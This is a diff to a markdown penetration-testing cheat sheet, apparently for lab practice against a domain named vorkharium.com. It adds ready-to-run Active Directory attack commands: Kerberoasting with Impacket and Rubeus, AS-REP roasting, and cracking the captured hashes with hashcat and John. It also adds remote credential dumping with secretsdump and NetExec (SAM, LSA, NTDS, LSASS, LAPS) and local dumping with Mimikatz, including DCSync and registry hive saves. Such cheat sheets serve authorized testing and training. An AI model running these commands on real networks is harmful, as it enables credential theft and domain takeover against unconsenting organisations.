@@ -87,8 +87,8 @@ enum4linux -U 172.16.150.10
 ### Domain Password Policy Enumeration
 ```shell
 # NetExec and CrackMapExec
-nxc smb 172.16.150.10 -u 'vivi' -p 'Thundaga2000' --pass-pol
-crackmapexec smb 172.16.150.10 -u 'tidus' -p 'ToZanarkand2001' --pass-pol
+nxc smb 172.16.150.10 -u 'Vivi' -p 'Thundaga2000' --pass-pol
+crackmapexec smb 172.16.150.10 -u 'Tidus' -p 'ToZanarkand2001' --pass-pol
 
 # enum4linux
 enum4linux -U 172.16.150.10 # Without credentials
@@ -248,7 +248,7 @@ nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
 nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth
 
 # We can also use CrackMapExec running almost the same commands replacing "nxc" for "crackmapexec". For example:
-crackmapexec smb 172.16.150.10 -u john -p passwords.txt
+crackmapexec smb 172.16.150.10 -u Dovahkiin -p 'FusRoDah!'
 ```
 ### Local Credential Hunting
 ```shell
@@ -350,7 +350,7 @@ $Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
 Get-DomainUser -SPN -Domain vorkharium.com -Credential $Cred | select SamAccountName
 ```
-For a complete and detailed list for PowerView.ps1 check the following link:
+For a complete and detailed list of all PowerView.ps1 commands check the following link:
 https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
 ### Impacket PsExec, WmiExec and SMBExec - SMB Shell Access with Password or Pass-the-Hash
 ```shell
@@ -391,27 +391,116 @@ xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/
 sudo xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share
 # Example 2
 xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share
-
 ```
 ### Kerberoasting with Impacket
 ```shell
-
+# Using john to obtain the hash of jane
+impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane
+# Cracking the hash
+hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 ### Kerberoasting with Rubeus.exe
 ```shell
-
+# Using john to obtain the hash of jane
+./Rubeus.exe kerberoast /domain:vorkharium.com /user:jane /creduser:vorkharium.com\john /credpassword:'Password123!' /nowrap
+# Cracking the hash
+hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 ### AS-REP Roasting with Impacket
 ```shell
+# AS-REP Roasting without password
+impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass
 
+# AS-REP Roasting with password
+impacket-GetNPUsers vorkharium.com/john:'Password123!' -dc-ip 172.16.150.10 -request -no-pass
+
+# Cracking the hash
+# With Hashcat
+hashcat -m 18200 -a 0 jane_hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt
+
+# With John
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
+sudo john jane_hash.txt --show
 ```
 ### Remote Credential Dumping with Impacket and NetExec
 ```shell
+# Using Impacket
+# With password
+impacket-secretsdump vorkharium.com/john:'Password123!'@172.16.150.10
+# Using hash
+impacket-secretsdump Administrator:@172.16.150.10 --hashes :1a06b4248879e68a498d3bac51bf91c9
 
+# Example with -just-dc-user
+impacket-secretsdump -just-dc-user jane vorkharium.com/john:"Password123!"@172.16.150.10
+
+# Example with -dc-ip
+impacket-secretsdump -dc-ip 172.16.150.10 'vorkharium.com/john:"Password123!"@172.16.150.10'
+
+# With NetExec
+# SAM
+nxc smb 172.16.150.20 -u john -p 'Password123!' --sam
+
+# LSA
+nxc smb 172.16.150.20 -u john -p 'Password123!' --lsa
+
+# NTDS.DIT RPC
+nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds
+
+# NTDS.DIT VSS
+nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds vss
+
+# LSASS
+nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
+nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
+nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
+nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump
+
+# LAPS Password
+nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
 ```
 ### Local Credential Dumping with Mimikatz and Impacket
 ```shell
+# Mimikatz.exe
+# Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
 
+# Run mimikatz.exe as administrator
+# On the mimikatz.exe console
+privilege::debug
+sekurlsa::logonpasswords # Hashes and plaintext passwords
+
+# More mimikatz.exe
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords # Hashes and plaintext passwords
+lsadump::sam
+lsadump::sam SystemBkup.hiv SamBkup.hiv
+lsadump::dcsync /user:krbtgt
+lsadump::lsa /patch # Both of these dump SAM
+
+# One-liners
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+
+# SAM and NTDS.DIT Dump
+# reg.exe
+reg save hklm\sam 'C:\Windows\Temp\sam'
+reg save hklm\system 'C:\Windows\Temp\system'
+reg save hklm\security 'C:\Windows\Temp\security'
+
+# Transfer the **sam, system,** and **security** files from Windows to Kali and dump locally
+# Copy
+Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\svc_veracrypt\Desktop\NTDS.DIT
+
+# impacket-secretsdump
+impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
+impacket-secretsdump -system SYSTEM -sam SAM -ntds NTDS.DIT local
+impacket-secretsdump -sam SAM -system SYSTEM local
+
+# samdump2
+samdump2 system sam
+
+# Note: Pay attention to case sensitive, upper and lower case. Try both tools always, one might fail
 ```
 ### Silver Ticket
 ```shell
